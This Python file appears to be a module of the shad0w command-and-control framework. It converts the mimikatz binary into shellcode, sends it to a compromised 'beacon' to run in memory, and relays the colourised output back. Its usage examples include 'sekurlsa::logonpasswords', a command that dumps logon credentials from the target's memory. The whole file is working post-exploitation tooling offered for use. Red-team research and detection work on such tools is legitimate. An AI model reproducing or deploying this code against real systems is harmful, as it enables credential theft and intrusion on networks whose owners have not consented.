#
# Execute mimikatz on a session
#

import argparse

from lib import shellcode

__description__ = "Execute mimikatz commands in memory on the target"
__author__ = "@_batsec_, @gentilkiwi"

# beacon to exec command on
current_beacon = None

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of mimikatz binary
MIMIKATZ_BIN = "/root/shad0w/bin/mimikatz.x64.exe"

# did the command error
ERROR = False
error_list = ""

# let argparse error and exit nice

def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None):
    if message != None: print(message)
    return

def mimikatz_callback(shad0w, data):
    data = data.replace(".#####.", "\033[1;32m.#####.\033[0m")
    data = data.replace(".## ^ ##.", "\033[1;32m.##\033[0m \033[1;39m^\033[0m \033[1;32m##.\033[0m")
    data = data.replace("## / \\ ##", "\033[1;32m##\033[0m \033[1;39m/ \\\033[1;32m \033[1;32m##\033[0m")
    data = data.replace("## \\ / ##", "\033[1;32m##\033[0m \033[1;39m\\ /\033[1;32m \033[1;32m##\033[0m")
    data = data.replace("'## v ##'", "\033[1;32m'##\033[0m \033[1;39mv\033[1;32m \033[1;32m##'\033[0m")
    data = data.replace("'#####'", "\033[1;32m'#####'\033[0m")

    shad0w.event.beacon_info(current_beacon, data)

    return ""

def main(shad0w, args, beacon):
    global current_beacon

    # make beacon global
    current_beacon = beacon

    # usage examples
    usage_examples = """

Examples:

mimikatz
mimikatz -x coffee
mimikatz -x sekurlsa::logonpasswords
"""

    # init argparse
    parse = argparse.ArgumentParser(prog='mimikatz',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)

    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # set the args
    parse.add_argument("-x", "--execute", nargs='+', required=True, help="Mimikatz command to execute")
    parse.add_argument("-n", "--no-exit", action="store_true", required=False, help="Leave mimikatz running")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass

    # show the errors to the user
    if not args.execute:
        print(error_list)
        parse.print_help()
        return

    if args.execute:
        params = ' '.join(args.execute)

        if not args.no_exit:
            params = params + " exit"

        # kinda a hack to make sure we intergrate nice with the shellcode generator
        args.param = args.execute
        args.cls = False
        args.method = False
        args.runtime = False
        args.appdomain = False

        b64_comp_data = shellcode.generate(MIMIKATZ_BIN, args, params)

    # dont clear the callbacks, cause the responses are chunked
    shad0w.clear_callbacks = False

    shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[current_beacon]["callback"] = mimikatz_callback